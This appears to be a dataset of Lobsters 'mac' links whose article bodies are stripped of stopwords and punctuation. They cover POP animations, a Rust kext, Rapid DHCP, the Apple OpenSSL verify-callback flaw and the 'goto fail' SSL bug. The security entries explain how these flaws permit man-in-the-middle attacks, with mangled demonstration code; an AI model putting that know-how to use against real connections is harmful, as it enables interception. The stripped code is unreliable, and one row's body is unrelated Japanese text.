linker flag usage pop adopts core animation explicit animation programming model use including following import objectivec using embedded framework swift start stop update start animation add object wish animate objectivec popspringanimation anim popspringanimation animation layer popaddanimation anim forkey mykey swift let anim popspringanimation layerpopadd anim forkey mykey stop animation remove object referencing key specified start objectivec layer popremoveanimationforkey mykey swift layerpopremoveanimation forkey mykey key also used query existence animation updating tovalue running animation provide seamless way change course objectivec anim layer popanimationforkey mykey anim update value new destination animtovalue else create start new animation swift let anim layerpopanimation forkey mykey popspringanimation update value new destination animtovalue else create start new animation layer used example pop interface implemented category addition nsobject nsobject subclass animated type four concrete animation type spring decay basic custom spring animation used give object delightful bounce example use spring animation animate layer bound current value objectivec popspringanimation anim popspringanimation animationwithpropertynamed kpoplayerbounds animtovalue nsvalue valuewithcgrect cgrectmake layer popaddanimation anim forkey size swift let anim popspringanimation propertynamed kpoplayerbounds animtovalue nsvalue cgrect cgrect x width height layerpopadd anim forkey size decay animation used gradually slow object halt example decay layer positionx current value velocity per second objectivec popdecayanimation anim popdecayanimation animationwithpropertynamed kpoplayerpositionx animvelocity layer popaddanimation anim forkey slide swift let anim popdecayanimation propertynamed kpoplayerpositionx animvelocity layerpopadd anim forkey slide basic animation used interpolate value specified time period use easein easeout animation animate view alpha default duration objectivec popbasicanimation anim popbasicanimation animationwithpropertynamed kpopviewalpha animtimingfunction camediatimingfunction functionwithname kcamediatimingfunctioneaseineaseout animfromvalue animtovalue view popaddanimation anim forkey fade swift let anim popbasicanimation propertynamed kpopviewalpha animtimingfunction camediatimingfunction name kcamediatimingfunctioneaseineaseout animfromvalue animtovalue viewpopadd anim forkey fade popcustomanimation make creating custom animation transition easier handling cadisplaylink associated timestep management see header detail property property animated specified popanimatableproperty class example create spring animation explicitly set animatable property corresponding calayer bound objectivec popspringanimation anim popspringanimation animation animproperty popanimatableproperty propertywithname kpoplayerbounds swift let anim popspringanimation let property popanimatablepropertyproperty withname kpoplayerbounds popanimatableproperty animproperty property framework provides many common layer view animatable property box animate custom property creating new instance class example declare custom volume property objectivec prop popanimatableproperty propertywithname comfooradiovolume initializer popmutableanimatableproperty prop read value propreadblock id obj cgfloat value value obj volume write value propwriteblock id obj const cgfloat value obj setvolume value dynamic threshold propthreshold animproperty prop swift let prop popanimatablepropertyproperty withname comfooradiovolume initializer prop guard let prop prop else return read value propreadblock obj value guard let obj obj volumeable let value value else return value objvolume write value propwriteblock obj value guard var obj obj volumeable let value value else return objvolume value dynamic threshold propthreshold popanimatableproperty animproperty prop complete listing provided animatable property well information declaring custom property see popanimatablepropertyh debugging tip debugging pop obeys simulator toggle slow animation setting try enabling slow animation easily observe interaction consider naming animation allow easily identify referencing either via logging debugger objectivec animname springopen swift animation come associated tracer tracer allows record animationrelated event fast efficient manner allowing query analyze animation completion example start tracer configures log event animation completion objectivec popanimationtracer tracer animtracer tracershouldlogandresetoncompletion yes tracer start swift let tracer animtracer tracershouldlogandresetoncompletion true tracerstart see popanimationtracerh detail testing pop extensive unit test coverage install test dependency navigate root pop directory type assuming cocoapods installed include necessary ocmock dependency unit test target scenekit due scenekit requiring io o x pop scenekit extension nt provided box unfortunately weakly linked framework used due issue mentioned xcode release note remedy easily optin use scenekit simply add preprocessor macro section xcode project resource collection link external resource may prove valuable contributing see contributing file help license pop released bsd license see license file detail
726,Lobsters,mac,Apple macOS,A Minimal OS X kext Written (Partly) in Rust,http://philjordan.eu/article/a-minimal-osx-kext-written-in-rust,minimal o x kext written partly rust,minimal o x kext written partly rust preamble rust at basic linux kernel module rustko standalone toy o kernel core kernel hello world rust easy enough mainrs rustko makefile apparently rust used use segmented stack approach page rustcore setting stage stubrs line assembly code revealed stack overflow check disabled line line line line compiler flag red zone mailing list thread rust stack putting together conclusion limitation work rustcore sample xcode project rustykext github acknowledgement chris williams footnote want want actually,minimal o x kext written partly rust originally published march preamble work involves writing c c andor objectivec code part nt preferred choice language happens practical choice problem solution domain tend inhabit operating system kernel system programming reason programming language enable go low level seem decade old created software security academic curiosity new kid block though trying take sensible approach blending safety power expressiveness simplicity one gathering lot buzz lately mozilla rust another caught eye at shall focus one another time lot kernellevel development safety even interest application every take look see realistic alternative c c use kernel development rust used create basic linux kernel module rustko recently julia evans standalone toy o kernel happens picked client want write maintain osx kernel extension linux kernel code chance might able use new language serious work need work osxxnu wanted try port rustko osx month got around trying found core kernel hello world rust first step grab rust compiler version website build install easy enough read first section rest tutorial tried working example provide give basic feel language kernel business rustko defines rustmain function written rust writes hello rust kernel log printing done via print function set call c function printk code mainrs goal replicate osx first goal compiling rustko mainrs file standalone object file tutorial covered regular executables next port call rustko makefile rustc invocation rc lib c nt quite work rustc nt like okay easily fixed happy default name anyway next problem fixedstacksegment apparently obsolete well removing certainly fix compile error apparently rust used use segmented stack approach fixedstacksegment switched stack segment large enough call c code using one big stack default rust comment page stack worry somewhat kernel stack xnu anyway produced nice little maino file inspecting nm revealed rustmain indeed exported printk listed dependency printk osx kernel printfiolog kprintf replacing kprint printf caused problem seems rustc possibly llvm kind hardcoded knowledge function name luckily iolog thing used instead nb first argument iologprintf course format string raw string printing single literal string example chosen overlook vulnerability rust string nt nullterminated think original code might incorrectly relying byte place added end string version sure string c string conversion mechanism rust standard library probably rustcore would tidy solution setting stage part rustko stubrs directive nostd top mainrs disables whole rust standard library much like kernel nt contain full libc ca nt expect encounter full rust standard library even basic rust code dependency kernel module kexts need extra boilerplate satisfy kernel dynamic linker starting top line char morestack uh oh another ominous reference stack mentioned rest file must satisfying linker somehow searching web yielded assembly code associated commentary standard rust runtime name seems legacy dynamic stack expansion longer done called stack overflow detected nt know author rustko implemented array expected function suspected even implementing function hiding bigger problem took look generated code komaino text text section rustmain cmpq rsp ja movabsq movabsq rustmain callq morestack ret pushq rbp movq rsp rbp leaq rip rdi popq rbp jmpq printk slightly odd calling convention notwithstanding understanding happening incoming stack pointer compared threadlocal stack base reached base available stack memory morestack called handle overflow situation presumably exact size check depend actual stack frame size current function presumably terminating process thread judging ret instruction call expected morestack fix overflow long story short threadlocal storage nt exist kernel thread hold stack base pointer xnu kernel test null pointer guaranteed case would mean test always pass make code believe effectively infinite stack used following code inspect void base null asm movq r base void rsp null asm movq rsp r rsp iolog pn rsp pn base rsp nt know memory area used kernel though know rely behaviour besides waste wired memory cpu cycle keep check nt even work experience stack overflow kernel instantly kernel panic triplefault preceding virtual memory page mapped essentially guard area model overflow detection web search topic revealed stack overflow check disabled annotating function definition nosplitstack annotation rustmain reduced following expect text text section rustmain pushq rbp movq rsp rbp leaq rip rdi popq rbp jmpq printk need added every single function though could nt find filewide compiler flag equivalent trying forget retrofitting library become annoying quickly sure apparently stack check added late enough compilation avoided altogether compiling llvm bytecode instead compiling bytecode clang later article line char globaloffsettable used position independent code pic elf binary format o x us macho removed kext version crossed finger line function definition abort malloc free call linux kernel equivalent obviously basic libc function implementation nt actually needed current version mainrs presumably leftover original author experiment maybe earlier compiler version output required case need change osx kexts needed removed altogether line extern void rustmain void c prototype rust function name keep work function annotated nomangle rust much like c rust encodes function type namespace symbol name mangling raw name nomangle equivalent extern c c sidestep mechanism making function easily callable c line kmod initexit function generate debug output init function call rustmain kernel module boilerplate macro direct o x kext equivalent xcode generic kernel extension project template generates u need declare call rustmain include machmachtypesh void rustmain void kernreturnt rustykextstart kmodinfot ki void kernreturnt rustykextstop kmodinfot ki void kernreturnt rustykextstart kmodinfot ki void rustmain return kernsuccess kernreturnt rustykextstop kmodinfot ki void return kernsuccess easy enough could probably skipped indirection via c start function directly implemented rust probably nicer long term solution mean need rust definition kmodinfot kernreturnt type value compiler flag difference binary kernel extension user space code code kexts therefore compiled using following extra clang argument fnobuiltin msoftfloat fnocommon mkernel actually redundant mkernel expands static fnocommon fnobuiltin fnocxaatexit fnoexceptions fnononcallexceptions fnoasynchronousunwindtables fapplekext fnoweak fnortti also implies mnoredzone deal cspecific thing disabling exception rtti causing slightly different vtables relevant linking stage use apple linker anyway msoftfloat nt strictly required osx possible use floatingpoint simd code kernel however msoftfloat flag change calling convention floating point function argument rest kernel use flag moreover executing fpsimd instruction cause permanent change way thread context change done flag avoid generating fp code accident want limit use specific thread rust compiler understands csoftfloat flag similar effect recommend using unless know compiler flag really worried mnoredzone enabling c code used kext cause spurious stack memory overwrites red zone exists abis dictate signal interrupt handler move stack pointer rsp byte clobbering stack memory mean regular leaf function put temporary data stack past top stack without change rsp change back kernel stack tiny byte precious apple decided knock red zone head xnu interrupt handler overwrite stack memory starting directly rsp code assuming memory safe playing fire rustc llvmbased assumed might able tell backend lack red zone mnoredzone originally gcc clang copied name llc know disableredzone mailing list thread rust stack also mention rustc argument cllvmargs let pas argument llvm backend compile latest compiler version git nt seem support yet matter hard tried would accept disableredzone though searching source code conclude although flag exists internally never parsed used rustc wrote function rust encouraged value put stack experiment generated code moved stack pointer temporary never saw instance existance red zone assumed think least current version red zone never used assumed safe say might change future might missed something much like stack overflow check issue mentioned earlier use clang perform final stage compilation though compiling rust code xnu becomes rustc emit bc cratetype staticlib csoftfloat komainrs clang mkernel msoftfloat c komainbc reason combination csoftfloat msoftfloat seem ignored least compiler version using floatingpoint instruction emitted float used rust code fortunately nt something likely accidentally kernel code putting together rust code requisite compiler flag glue code c need link rust code c code add kext linkage boilerplate put kext bundle infoplist kind tedious hand xcode box decided use build system experiment well starting suitably named clean generic kernel extension project following disabled code signing kext target updated c code call rust function described earlier added custom script build rule rust source file r kext target script mkdir p derivedfiledir rustbin usrlocalbinrustc outdir derivedfiledir rustbin emit bc cratetype staticlib inputfilepath dttoolchaindir usrbinclang mkernel msoftfloat c derivedfiledir rustbin inputfilebase bc derivedfiledir rustbin inputfilebase irritatingly xcode mangle linecontinuation character script box put compilation one giant horrible line compiler argument rustc git master time writing thing seem change week week output file derivedfiledir rustbin inputfilebase bc derivedfiledir rustbin inputfilebase added mainrs file project adapted code rustko equivalent file xcode added copy bundle resource build phase moved compile source set bundle dependency remember used iolog rust code mean need add comapplekpiiokit comapplekpilibkern osbundlelibraries dictionary infoplist appropriate version aka snow leopard trick kext build load copy destination machine vm ensure rootwheel permission use sudo cp r rustykextkext tmp load sudo kextutil tmprustykextkext assuming system nt crashed point look system log consoleapp find hello rust message conclusion limitation work satisfying first step discover quickly using almost rust language feature attempting write useful code kind quickly lead compile link error various language infrastructure missing freestanding mode rustcore come probably writing considerable amount xnuspecific glue code example memory allocation etc certain thing presumably never work rust user thread model switching stack kernel nono thus probably also thread communication technique course also large number kernel apis need imported rust nt know mechanism including c header directly replicating apis hand slow errorprone finally beware rust compiler especially lower level bit still much flux expect code frequently broken new compiler getting code compile kernel bit challenge c compiler like gcc clang heavily influenced linux o x kernel development respectively support kernel mode good hope kernel development eventually becomes priority rust well could interesting alternative still rust newbie hope expand base something useful rust kernel point try write get let know go mistake omission discovered course placed sample xcode project rustykext github feel free use base experimentation even serious work acknowledgement thanks chris williams reading draft article helpful input footnote many people seem hate c claim c objectivec far superior found none language group could maybe particular safety continues problem buffer overflow still security issue easy shoot foot c say design seems time nt really want shoot foot want low level access memory system resource practice localised part code manual memory management another one thing make c practice frequently mean memory leak due forgotten deallocation worse dangling pointer actually want tight control resource usage accidental memory allocation direct control lifetime need thing requirement systemlevel software least von neumann machine popular kid today admit kernel panic nt exactly failing cleanly alternative would unwind stack longjmp exception style point code something probably practical write code us little stack space possible come nowhere near limit deeply recursive function anyway except tailrecursive
727,Lobsters,mac,Apple macOS,-no-cpp-precomp: the compiler flag that time forgot,http://www.mistydemeo.com/?p=78,nocppprecomp compiler flag time forgot,アクセス条件まで考える オリジナルプランで比べる 一軒家ならではの魅力 レストランでのウエディング,アクセス条件まで考える オリジナルプランで比べる 一軒家ならではの魅力 レストランでのウエディング
728,Lobsters,mac,Apple macOS,"Rapid DHCP: Or, how do Macs get on the network so fast? (2011)",http://cafbit.com/entry/rapid_dhcp_or_how_do,rapid dhcp mac get network fast,update july mt mentioned hacker news update july mt rfc detecting network attachment update july mt posted summary discussion,one life minor annoyance wait device connect network wake sleep often open lid eeepc netbook enter web address get dreaded webpage available message machine still working connecting wifi network occasion twiddle thumb long second network ready used frustrating thing know nt way know mac open lid macbook pro connects network nearly instantaneously fact matter fast network come even try load web page curiosity got better set investigate mac able connect network quickly network connect time operating system could improved figure three main category timeconsuming activity occur network initialization link establishment activity establishing communication network link layer case wifi radio must powered access point detected optional encryption layer eg wpa established link establishment device able send receive ethernet frame network dynamic host configuration protocol dhcp dhcp handshaking device negotiates ip address use local ip network dhcp server responsible managing ip address available use network miscellaneous overhead operating system may perform number mundane task process network initialization including running script looking preconfigured network setting local database launching program etc investigation thus far primarily concerned dhcp phase although two category would interesting study future set packet capture environment spare wireless access point observed network activity number device initialized network connection worstcase scenario let look network activity captured android tablet connecting samsung galaxy tab time second direction packet description rnr link established request client request ip address previously connected network request client request ip address discover okay give maybe different network dhcp server offer server offer ip address client request client accepts offered ip address ack server acknowledges client acceptance ip address tablet presumably interest optimization initially skipping dhcp discovery phase immediately requesting previous ip address problem different network dhcp server ignores request second tablet stubbornly try request old ip address another second resigns starting scratch performs dhcp discovery needed obtain ip address new network process took whopping second complete note would faster dhcp server configured send naks update simmons fairness delay would nt bad device connecting network previously using however notice tablet wait full second link establishment even think starting dhcp process engineering snappiness usually mean finding lot small opportunity save millisecond someone definitely dropped ball contrast let look packet dump machine lightningfast network initialization see uncover magic happening hood macbook pro macos time second direction packet description rnr link established request broadcast whohas client validating linklocal address request unicast whohas tell request unicast whohas tell reply unicast dhcp server isat request unicast whohas tell request broadcast whohas tell broadcast whohas tell broadcast whohas tell reply unicast isat router port airport detection implies ip interface configured normal ip activity newly configured interface request ack key understanding magic first three unicast arp request look like mac o remembers certain information last connected network last several network particular must least persist following tuple network ethernet address dhcp server ip address dhcp server ip address assigned dhcp server network initialization mac transmits carefully crafted unicast arp request stored information network memory attempt send request specific ethernet address dhcp server network asks server ip address request server reply ip address mac formerly using network unless network host radically shuffled around one arp request result request corresponding current network current network happens one remembered network network recognition technique allows mac rapidly discover connected known network network recognized presumably mac know dhcp lease still active immediately presumptuously configures ip interface address know good network well perform selfarp good measure nt seem wait response dhcp handshaking process begin background sending dhcp request assumed ip address network interface available use handshaking process network recognized assume mac would know begin dhcp discovery phase instead sending blind request former ip address galaxy tab mac rapid network initialization credited network recognition scheme judging use arp problematic deal userspace unusually regular transmission interval reliable delay packet sent guessing mac dhcp client system entirely implemented tight kernelmode code mac began ip interface initialization process mere link establishment far faster device tested android device galaxy tab rely usermode dhclient system part dhcpcd package dhcpcd program doubt brings lot additional overhead loading program context switching perhaps even running script next step daring kernel hacker implement similarly aggressive dhcp client system linux kernel enjoy fast signon speed android tablet android phone ubuntu netbook already exists minimal dhcp client implementation linux kernel lack certain feature configuring dns nameservers perhaps would nt much work extend code support network recognition interface usermode daemon handle auxillary configuration information received via dhcp ever get spare cycle maybe even take stab update july mt post mentioned hacker news lot lively discussion comment people pointed disadvantage putting fullfeatured dhcp client kernel skeptical putting dhcp client kernel however nt want elaborate since post getting way lengthy known would subject peer review might bit careful word argument putting dhcp client kernel basically boil achieving speed shaving millisecond ca nt launch program wait dynamically link load config file etc get response time mac link establishment transmitting first dhcp packet told dhcpcd program persistent daemon maybe launch overhead nt something keeping linux host response time arp trick could awkward userspace need use raw socket interface transmitting nt big deal use something like packet interface sniff incoming packet observe arp reply nt played around packet interface sure pro con might neither showstopper improved usermode dhcp client thinking time think would certainly start usermode solution since carefully crafted daemon able achieve comparable response time arping program nt seem problem using packet send receive arp packet userspace update july mt thanks macfaden pointing comment scheme basically implementation rfc detecting network attachment coauthored apple employee update july mt thanks steinar h gunderson pointing comment dhcp server test network incorrectly configured since using mostly box dhcpd configuration ubunbtu linux nt set authoritative default nt promptly sending naks response galaxy tab request old ip address fixing problem dhcp server galaxy tab dhcp handshake happens quite bit faster although still time slower mac revised chart network activity galaxy tab samsung galaxy tab revised time second direction packet description rnr link established request client request ip address previously connected network nak server decline allow network discover offer server offer ip address client request client accepts offered ip address ack server acknowledges client acceptance ip address time line see nonmac device nontest dhcp plus bit time link initialization enough frequently get connection error web browser need find way shave emerging consumer electronics device consumer conditioned think pc something wait expect nonpc network device behave like light switch posted summary discussion another entry
729,Lobsters,mac,Apple macOS,Apple OpenSSL Verification Surprises,https://hynek.me/articles/apple-openssl-verification-surprises/,apple openssl verification surprise,abstract news documentation deprecated verify callback documentation verifycallback return terminated rely correct behavior perform important check within callback behavior expose maninthemiddle attack background patched effort use certificate pinning limiting trust certain ca undermined tea revalidating chain solution disable tea source code explicitly set error code compile openssl homebrew macports cloning epitome great software python ruby nodejs impact chromium o php q bug affect io affect apple software like safari mail credit laurens van houtven christian heimes jeanpaul calderone glyph alex stapleton matthew green,apple ship patched version openssl macos precaution taken change rob power choose trusted ca break semantics callback used custom check verification client softwareabstractif openssl certificate verification fails connecting server apple code intercept error attempt verify certificate chain system trust setting keyring potentially throwing away verification result therefore limit trust certain ca using sslctxloadverifylocationsthis apparently news appear widely knowncontrary documentation returning sslctxsetverify callback make tl handshake fail make callback unsuitable extra verification purpose hostname verification mitre assigned issueapple interested bug report deprecated openssl year ago hence summary together workaroundsthe verify callbackopenssl sslctxsetverify allows setting callback function called certificate chain invoked result openssl verification certificate success failure object used get certificate applicable verification error questionas return code callback apple documentation say return value verifycallback control strategy verification process verifycallback return verification process immediately stopped verification failed state sslverifypeer set verification failure alert sent peer tlsssl handshake terminatedso technically callback useful two thing gaining information failure reacting itadditional check hostname verification strict certificate validation returning abort handshakebut caseinstead apple openssl abort chain verification ie callback get called remaining certificate chain fail handshake decides certificate chain peer trustworthyif rely correct behavior perform important check within callback behavior expose maninthemiddle attacksyou observe following c code include errnoh include netdbh include resolvh include stdioh include stringh include syssocketh include unistdh include opensslerrh include opensslsslh int verify int ok store always abort verification error return int main int argc char argv initialize openssl ssllibraryinit sslloaderrorstrings create context sslctx ctx sslctxnew ctx null errprinterrorsfp stderr abort load trusted ca default path sslctxsetdefaultverifypaths ctx set verify function sslctxsetverify ctx sslverifypeer verify resolve struct addrinfo hint ai memset hint sizeof hint hintsaifamily afinet hintsaisocktype sockstream hintsaiprotocol ipprototcp int aierror getaddrinfo wwwapplecom http hint ai aierror fprintf stderr getaddrinfo sn gaistrerror aierror abort connect int sock socket ai aifamily ai aisocktype ai aiprotocol connect sock ai aiaddr ai aiaddrlen close sock perror connect abort wrap connection tl ssl ssl sslnew ctx ssl null errprinterrorsfp stderr abort sslsetfd ssl sock sslconnect ssl errprinterrorsfp stderr else reached verify function printf connected cipher sn sslgetcipher ssl sslshutdown ssl sslfree ssl close sock sslctxfree ctx return compile using cc sslclientc lssl lcrypto sslclient run without argumentsthis program succeeds linked apple patched openssl fails error message like ssl routine certificate verify failed doublechecked back vintage centos definitely appleonly problembackgroundthe reason unexpected behavior apple trying helpful certificate validation especially trust database hassle openssl handling rather userhostile apple patched trust evaluation agent tea openssl give failed verification second chance using system keyring trust storeto follow happens also necessary understand tl context get passed around carry error code distinct return code verification callback mentioned error code directly affect tea behaviornow client attempt tl handshake server tea first call openssl original verification functionif openssl verification fails ie openssl verify certificate chain callback return something else tea check current context error code one following constant one match tea attempt fix error verifying certificate chain succeeds handshake succeeds matter happened within openssl verification callbackthis problematic several reason unless explicitly set trusted root certificate initial verification always fail infamous error see example even telling openssl use default ca location line work exist o x well hidden within keyringtherefore unless explicitly change error code tea always think try fix failed verification instance discovered hostname mismatch within callback thus return tea still try verify certificate chain ignore objection chain trustworthyif want use one error code extra check eg blacklisting certain ca apple openssl ignore failure rather unexpected behavior since work correctly platformsany effort use certificate pinning limiting trust certain ca undermined tea revalidating chain younone obvious documentedsolutionsmy motivation point finger want warn offer solution far come three disable teaif tea disabled also overrule verification decision achieve part application initializationhowever far tell function public least find definition documentation outside apple source code patchanother approach setting want change code try example env sslclient major drawback approach make apple openssl another hopelessly outdated openssl installationexplicitly set error codethis probably best approach use verification callback apple openssl always change error within context something tea consider fixable would obvious choice int verify int ok store store return choose thoughcompile opensslin response bug report apple suggested use selfcompiled openssl ready migrate securetransport generally good advice openssl hopelessly datea practical way homebrew take pain compiling software keeping date brew install openssl similar alternative like macports work fine coursethis approach least two drawback though software apple ship compiled openssl python also doublecheck selfcompiled software really pick custom openssl instead system one example withbrewedopenssl within homebrew openssl access keyring thus system trust store apple patch help manage set trusted ca probably help mozilla infamous cacertpem homebrew help bit cloning system keyring usrlocaletcopensslosxcertpem installation sslctxsetdefaultverifypaths work boxin case cope two trust store opensssl one system one make everything bit crude add moving partsultimately longterm way go although openssl epitome great software going anywhere especially numerous crossplatform software including limited development platform like python ruby nodejs using openssl tl needsimpacttogether christian heimes analyzed multiple highprofile open source project tl support whether affected require prior notice none seemed perform validation within verification callback exploitable way consider publication safethat mean software exist though according documentation putting verification code callback perfectly legit example google us pattern within chromium o php caution order endangered crossplatform software assumes openssl code behaves identically across platformsi one ran bug testing patch bug tracker worked perfectly fine linuxq anothe temporal proximity bug securetransport affect macos io coincidentali also try ride attention wave provided filed bug issue apple bug database week publisheddoes affect io noios ship openssl issuedoes affect apple software like safari mail nogenerally apple software mac desktop software matter using apple securetransport opensslcreditsi like thank laurens van houtven christian heimes jeanpaul calderone glyph alex stapleton matthew iversen matthew green assistance researching assessing bug
730,Lobsters,mac,Apple macOS,Apple Releases OS X 10.9.2 With Fix for Major SSL Vulnerability,http://www.macrumors.com/2014/02/25/osx-update-ssl-facetime-audio/,apple release o x fix major ssl vulnerability,gotofailcom december seven beta iteration facetime audio o x maverick update o x maverick update combo security update mountain lion security update lion security update server lion,apple today released o x includes fix major ssl security flaw first came light friday release io bug introduced form single line errant code allowed attacker bypass ssltls verification routine left o x user vulnerable maninthemiddle attack shared wired wireless network could allow attacker intercept communication affected machine acquiring sensitive information like login credential password injecting harmful malware test gotofailcom updating o x ssl vulnerability first introduced io affect mac running o x lion mountain lion user affected o x first seeded developer december seen seven beta iteration since time along emergency fix ssl bug o x also includes facetime audio new blocking control imessage facetime call waiting support facetime mail fix bug fetching message autofill improvement several bug fix general improvement recommended user running o x maverick upgrade o x soon possible disable vulnerability o x maverick update mb o x maverick update combo mb alongside o x apple also released security update o x mountain lion lion security update mountain lion mb security update lion mb security update server lion mb
731,Lobsters,mac,Apple macOS,Apple's SSL/TLS bug,https://www.imperialviolet.org/2014/02/22/applebug.html,apple ssltls bug,security update top apple published source code serverkeyexchange peter nelson tlslite,yesterday apple pushed rather spooky security update io suggested something horribly wrong ssltls io gave detail since answer top hacker news thread guess cat bag already misinformationquashing stage apple bug static osstatus sslverifysignedserverkeyexchange sslcontext ctx bool isrsa sslbuffer signedparams signature signaturelen osstatus err err hashctx serverrandom goto fail err hashctx signedparams goto fail goto fail err hashctx hashout goto fail fail sslfreebuffer signedhashes sslfreebuffer hashctx return err quoted apple published source code note two goto fail line row first one correctly bound statement second despite indentation nt conditional code always jump end second goto err contain successful value update operation successful signature verification never fail signature verification checking signature serverkeyexchange message used dhe ecdhe ciphersuites communicate ephemeral key connection server saying ephemeral key signature certificate know link ephemeral key certificate chain broken everything fall apart possible send correct certificate chain client sign handshake wrong private key sign proof server posse private key matching public key certificate since securetransport affect io point prior confirmed also o x prior confirmed affect anything us securetransport software platform although chrome firefox use n ssltls however nt mean much say software update system machine might using securetransport coded quick test site http note port number cve number normal site running port expected work port server sending certificate signing completely different key load http site port bug certificate chain correct link handshake chain broken nt believe sort certificate pinning would stopped also nt affect site using dhe ecdhe ciphersuites attacker get choose ciphersuite case choose one work also nt affect tl different function verifying different serverkeyexchange message tl attacker choose version client accept client enables tl appears would workaround issue likewise client enabled plain rsa ciphersuites serverkeyexchange also work around issue two former workaround much preferable based test site io o x fix issue update look like bug introduced o x existed least version io io released yesterday fix sort subtle bug deep code nightmare believe mistake feel bad whoever might slipped editor created stripped code issue extern int f int g int ret goto ret f return ret compile wall enable warning neither gcc clang xcode make peep dead code surprising better warning could stopped perhaps false positive rate high real codebases thanks peter nelson pointing clang wunreachablecode warn wall maybe coding style contributed allowing ifs without brace one incorrect indentation brace nt seem terribly convincing test case could caught difficult deep handshake one need write completely separate tl stack lot option sending invalid handshake chromium patched version tlslite sort thing recall test case exactly sound like know monday morning involves code review effective sort bug auditing review change go idea code review culture like apple strongly believe colleague wanteh ryan sleevi would caught slipped like although everyone blessed folk like lastly lot discussion yesterday apple missed checking hostname certificate true curl o x command line oddly accepts http connection ip address ip address nt certificate ca nt find anything safari nt problem
732,Lobsters,mac,Apple macOS,Running SDRSharp on Mac OS X,http://jasiek.me/2014/02/22/running-sdrsharp-on-mac-os-x.html,running sdrsharp mac o x,gbp dvbt dongle rtlsdr suite gqrx sdrsharp download mono platform install xamarin studio project page install portaudio rtlsdr library macports get sdrsharp source build sdrsharp binary set symbolic link library installed run,important note approach may work modern sdrsharp release click detail back bought one gbp dvbt dongle see good anything turn pretty amazing device ca nt possibly beat price given capability sadly variety software available mac leaf much desired apart rtlsdr suite gqrx program available evening turned attention sdrsharp sdr suite originally targeted window platform written c immediately thought mono would possible run sdrsharp mac given mono runtime mind last time looked mono around folk behind working reimplementing windowsforms nt exactly ready prime time back writeup describes get sdrsharp running mac o x download mono platform install xamarin studio first need download mono runtime equivalent net framework platform window head project page select mac osx two package download install install portaudio rtlsdr library order talk dongle need library rtlsdr expose abstraction layer talk dongle using libusb since native library compiled particular platform case mac o x need build scratch using macports sdrsharp us pinvoke facility talk library question need build right architecture assuming macports installed simply issue following command universal variant important sudo port install portaudio universal sudo port install rtlsdr universal building latter may take least case imagemagick rebuilt among others go figure get sdrsharp source directory choice run following svn co http subversionassemblacomsvnsdrsharptrunk sdrsharp pull latest sdrsharp source repository build sdrsharp binary fire xamarin studio open existing project select sdrsharpsln sdrsharp directory checked change active configuration project active configuration select build build give minute build everything set symbolic link library installed tell mono runtime load native library need least portaudio latter required want use usb dongle ln libportaudiodylib ln librtlsdrdylib run head sdrsharprelease directory run edit eric brombaugh pointed following mono ide suggestion made fine running newer version mac o x still install older version mono monodevelop older version net tool sdr sln file nt recognized back version number sln file editing value header edit increasing performance may try luck precompiling executable mono aotfull oall sdrsharpexe prevent mono runtime executing jit compiler potentially leading increased performance appears help old mac mini ymmv run binary mono sdrsharpexe precompiled code executed automatically edit sdrsharp go closed source author sdrsharp decided close source software okay running old version september get source github instead running svn co following git clone http githubcomcgommelsdrsharp attempted run latest binary mono succeed
733,Lobsters,mac,Apple macOS,Postgres.App,https://github.com/PostgresApp/PostgresApp/releases,postgresapp,beta bundle postgresql postgresql postgresql stable version mac running macos later postgresql postgresql postgresql postgresql postgresql stable version mac running macos later postgresql postgresql postgresql mac running macos later postgresql postgresql postgresql postgresql,quarterly postgresql release bugfix release postgresql new beta version postgresql postgresql beta includes list downloads included release beta bundle addition postgresql beta download also includes stable version postgresql try postgresql running existing database time come version postgresql postgresql postgis postgresql postgis postgresql postgis stable version mac running macos later latest stable version postgresapp offer two downloads come latest version postgresql postgresql postgis come recent version postgresql postgresql postgis postgresql postgis postgresql postgis postgresql postgis stable version mac running macos later come following version postgresql postgresql postgis postgresql postgis postgresql postgis mac running macos later even older mac offer legacy version postgresapp old ui choose legacy version postgresql postgis postgresql postgis postgresql postgis postgresql postgis
734,Lobsters,mac,Apple macOS,Pac4Mac - Forensics Framework for Mac OS X,https://code.google.com/p/pac4mac/,forensics framework mac o x,,google code archive requires javascript enabled browser
735,Lobsters,mac,Apple macOS,Setting OmniGraphSketcher Free,http://www.omnigroup.com/blog/setting-omnigraphsketcher-free,setting omnigraphsketcher free,apps past github existing open source framework,may know last summer made difficult decision stop selling omnigraphsketcher focus application part decision elected remove app website instead continuing offer free product done apps past people continued use free apps enough time work mean bug crop usually new o release able fix timely manner everyone end frustrated omnigraphsketcher decided go different route open source open source mean everyone access omnigraphsketcher code anyone inclined work bug fix longer dependent ceo taking vacation time new user discover app without generating support cost project longer revenue stream aware drawback open source software convinced setting graphsketcher free best option going forward proud work omnigraphsketcher love many people possible able use fact support received omnigraphsketcher discontinued one reason think project work well nondevelopers download mac app available new project home github io side submission app store dependent couple trickier thing hoping graphsketcher make back without much delay developer interested poking around graphsketcher source code git clone recursive git githubcomgraphsketchergraphsketcher graphsketcher relies existing open source framework building app still simple cloning opening workspace app like build mac ipad hitting play button end road graphsketcher putting omnigraphsketcher bed fan old app hope check new project post feedback github future contributor take look course support human continue provide assistance paid customer omnigraphsketcher mac ipad version o x io support
736,Lobsters,mac,Apple macOS,How Steve Jobs Almost Put A Little Man In Every Mac,http://www.fastcodesign.com/3025477/how-steve-jobs-almost-put-a-little-man-in-every-mac,steve job almost put little man every mac,reportedly said teeny little super guy recall hertzfeld universally recognizable today character sketchbook writes clippy rover primordial man,february manic steve job bounded office andy hertzfeld primary software architect apple topsecret next gen computer mac celebrates birthday today wildeyed obviously excited job waved hand around head shouted mr macintosh got mr macintosh hertzfeld blinked started job uncomprehending mr macintosh asked mr macintosh mysterious little man life inside macintosh computer job reportedly said pop every least expect wink disappears quick sure saw plant reference manual legend mr macintosh one know real practically trembling excitement steve job continued imagine weird funny way user would interact mr macintoshvideo one every thousand two time pull menu instead normal command get mr macintosh leaning wall menu steve exclaimed wave quickly disappear try get come back able job imagined digital equivalent lilliputian orchestra live inside stereo imaginative parent tell child make every radio work instead joking job actually wanted make happen inspired revolutionary graphic user interface created xerox parc apple spent last three year building computer would change world job talking programming version teeny little super guy right core operating systemhertzfeld thought awesome engineer like always daydream building surreptitious little hack software recall hertzfeld account meeting cofounder chairman company suggesting something really wild mister macintoshas work progressed macintosh operating system throughout next couple year hertzfeld job worked hard make dream mr macintosh reality job flew office apple marketing team told start preparing hint existence mr macintosh official material also recruited belgian artist jeanmichel folon famous wellrespected cartoonist painter also poster woody allen purple rose cairo design look mr macintosh making visual pun name apple new computer folon drew whimsical character fedora wearing mackintosh 